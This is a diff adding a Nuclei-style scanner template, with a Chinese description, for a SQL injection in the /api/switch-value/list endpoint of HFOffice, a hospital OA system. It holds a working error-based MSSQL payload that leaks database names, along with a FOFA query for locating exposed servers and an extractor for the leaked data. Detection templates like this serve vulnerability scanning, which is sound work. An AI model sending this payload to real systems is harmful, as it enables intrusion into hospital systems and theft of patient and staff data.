@@ -1,0 +1,39 @@
+id: HFOffice-api-list-SQLi
+
+info:
+  name: HFOffice /api/switch-value/list接口SQL注入漏洞
+  author: known
+  severity: medium
+  description: |
+    红帆 HFOffice 是一款广泛应用于医院的OA系统，其某api接口存在SQL注入漏洞。攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - https://
+  metadata:
+    max-request: 1
+    fofa-query: body="./config/pc-app-config.js" && title="HFOffice"
+    verified: "true"
+  tags: HFOffice, SQLi
+
+http:
+  - raw:
+      - |
+        @timeout: 25s
+        GET /api/switch-value/list?sorts=%5B%7B%22Field%22:%22convert(int,stuff((select%20quotename(name)%20from%20sys.databases%20for%20xml%20path(%27%27)),1,0,%27%27))%22%7D%5D&conditions=%5B%5D HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 400
+          # - contains_all(body,'@', ':')
+          - contains_all(body, '在将', '转换成数据类型', '时失败')
+        condition: and
+
+    extractors:
+      - type: regex
+        # name: attachmentId
+        part: body
+        # internal: true
+        # group: 1
+        regex:
+          - '(在将(.*?)值(.*?)转换成数据类型(.*?)时失败)'
